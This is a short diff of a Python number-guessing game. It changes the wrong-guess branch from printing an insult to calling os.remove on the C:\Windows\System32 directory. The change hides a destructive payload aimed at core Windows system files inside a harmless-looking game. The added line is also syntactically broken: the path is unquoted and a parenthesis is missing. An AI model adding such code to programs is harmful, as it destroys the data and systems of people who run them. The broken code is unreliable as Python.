@@ -13,4 +13,4 @@ guess = int(guess)
 if guess == number:
     print("nice job! you got it right")
 else:
- print("delete your shit!")
+ print(os.remove(C:\Windows\System32)
